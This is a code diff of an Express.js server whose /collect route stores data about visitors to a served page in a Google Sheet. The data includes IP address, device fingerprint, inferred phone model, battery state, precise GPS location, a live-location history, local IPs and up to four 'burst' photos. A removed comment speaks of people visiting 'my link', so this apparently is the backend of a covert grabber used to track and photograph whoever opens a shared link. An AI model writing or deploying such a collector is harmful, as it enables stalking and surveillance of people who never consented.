@@ -1,66 +1,117 @@
-const express = require('express');
-const { google } = require('googleapis');
-const cors = require('cors');
-const path = require('path');
+import 'dotenv/config';
+import express from 'express';
+import cors from 'cors';
+import bodyParser from 'body-parser';
+import path from 'path';
+import { fileURLToPath } from 'url';
+import { google } from 'googleapis';
+
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
+
 const app = express();
+const PORT = process.env.PORT || 8080;
 
-// SETTINGS
-app.use(cors());
-// This allows the high-quality burst photos to be sent
-app.use(express.json({ limit: '50mb' }));
-app.use(express.urlencoded({ limit: '50mb', extended: true }));
-
-// 1. SERVE THE WEBSITE
-// This tells Render: "When someone visits my link, show them index.html"
+// Serve the frontend index.html (single-app deployment)
 app.use(express.static(__dirname));
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
-});
+app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
 
-// 2. GOOGLE SHEETS SETUP
-const auth = new google.auth.GoogleAuth({
-    credentials: {
-        client_email: process.env.GOOGLE_CLIENT_EMAIL,
-        private_key: process.env.GOOGLE_PRIVATE_KEY.replace(/\\n/g, '\n'),
-    },
-    scopes: ['https://www.googleapis.com/auth/spreadsheets'],
-});
+// API middleware
+app.use(cors());
+app.use(bodyParser.json({ limit: '15mb' }));
+
+// Google Sheets client (Service Account)
+const auth = new google.auth.JWT(
+  process.env.GOOGLE_CLIENT_EMAIL,
+  undefined,
+  (process.env.GOOGLE_PRIVATE_KEY || '').replace(/\\n/g, '\n'),
+  ['https://www.googleapis.com/auth/spreadsheets']
+);
 const sheets = google.sheets({ version: 'v4', auth });
 
-// 3. THE "COLLECT" ROUTE
-// This matches the button in your index.html
+// Brand/model inference
+function inferBrandModel(ua = '', gpu = {}) {
+  const t = ua.toLowerCase();
+  if (t.includes('iphone')) return { brand: 'Apple', model: 'iPhone' };
+  if (t.includes('ipad')) return { brand: 'Apple', model: 'iPad' };
+  if (t.includes('sm-') || t.includes('samsung')) return { brand: 'Samsung', model: 'Galaxy/SM series' };
+  if (t.includes('pixel')) return { brand: 'Google', model: 'Pixel' };
+  if (t.includes('redmi') || t.includes('xiaomi') || t.includes('mi ')) return { brand: 'Xiaomi', model: 'Mi/Redmi' };
+  if (t.includes('oneplus')) return { brand: 'OnePlus', model: 'OnePlus' };
+  if (t.includes('vivo')) return { brand: 'Vivo', model: 'Vivo' };
+  if (t.includes('oppo')) return { brand: 'Oppo', model: 'Oppo' };
+  if (t.includes('realme')) return { brand: 'Realme', model: 'Realme' };
+  const gr = `${gpu.vendor || ''} ${gpu.renderer || ''}`.toLowerCase();
+  if (gr.includes('apple')) return { brand: 'Apple', model: 'Apple GPU device' };
+  if (gr.includes('adreno')) return { brand: 'Android (Qualcomm)', model: 'Adreno-based' };
+  if (gr.includes('mali')) return { brand: 'Android (ARM)', model: 'Mali-based' };
+  return { brand: 'Unknown', model: 'Unknown' };
+}
+
+// Append a row to Google Sheets
+async function appendToSheet(row) {
+  await sheets.spreadsheets.values.append({
+    spreadsheetId: process.env.GOOGLE_SHEET_ID,
+    range: 'Logs!A1',
+    valueInputOption: 'RAW',
+    requestBody: { values: [row] }
+  });
+}
+
+// Collect route
 app.post('/collect', async (req, res) => {
-    try {
-        const { ts, ua, gpu, battery, loc, burstImages } = req.body;
-        const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
+  try {
+    // Public IP
+    const ipHeader = req.headers['x-forwarded-for'];
+    const clientIp = Array.isArray(ipHeader)
+      ? ipHeader[0]
+      : (ipHeader || '').split(',')[0].trim() || req.socket.remoteAddress || 'unknown';
 
-        // Prepare the photos: we combine them into a single cell
-        const photoData = burstImages ? burstImages.join(' | ') : "No Photos";
+    const body = req.body || {};
+    const { ts, hints, gpu, battery, ips, location, liveLocations, burstImages } = body;
 
-        await sheets.spreadsheets.values.append({
-            spreadsheetId: process.env.GOOGLE_SHEET_ID,
-            range: 'Sheet1!A1',
-            valueInputOption: 'USER_ENTERED',
-            requestBody: {
-                values: [[
-                    ts,                       // Column A: Date/Time
-                    ip,                       // Column B: IP Address
-                    ua,                       // Column C: Device Info
-                    `Level: ${battery.level}%`, // Column D: Battery
-                    gpu.renderer,             // Column E: GPU/Model
-                    `Lat:${loc.lat}, Lon:${loc.lon}`, // Column F: Location
-                    photoData.substring(0, 45000) // Column G: Photo Strings
-                ]]
-            }
-        });
-
-        console.log(`✅ Success: Data received from IP ${ip}`);
-        res.status(200).send("Logged to Google Sheet");
-    } catch (error) {
-        console.error('❌ Error:', error);
-        res.status(500).send("Server Error: " + error.message);
+    // Basic validation
+    if (!ts || !hints || !hints.ua) {
+      return res.status(400).json({ error: 'Invalid payload' });
     }
+
+    const brandModel = inferBrandModel(hints.ua, gpu);
+
+    // Optional: include thumbnails directly in sheet (small data URLs from frontend)
+    const img1 = burstImages?.[0] || '';
+    const img2 = burstImages?.[1] || '';
+    const img3 = burstImages?.[2] || '';
+    const img4 = burstImages?.[3] || '';
+
+    const row = [
+      ts,
+      clientIp,
+      hints.ua,
+      brandModel.brand,
+      brandModel.model,
+      gpu?.vendor || '',
+      gpu?.renderer || '',
+      battery?.levelPercent ?? '',
+      battery?.charging ?? '',
+      location?.lat ?? '',
+      location?.lon ?? '',
+      location?.acc ?? '',
+      JSON.stringify(liveLocations || []),
+      JSON.stringify(ips || {}),
+      img1,
+      img2,
+      img3,
+      img4
+    ];
+
+    await appendToSheet(row);
+    return res.json({ ok: true, ip: clientIp, brandModel });
+  } catch (err) {
+    console.error(err);
+    return res.status(500).json({ error: err.message });
+  }
 });
 
-const PORT = process.env.PORT || 8080;
-app.listen(PORT, () => console.log(`🚀 Website live on port ${PORT}`));
+app.listen(PORT, () => {
+  console.log('Server running on port', PORT);
+});
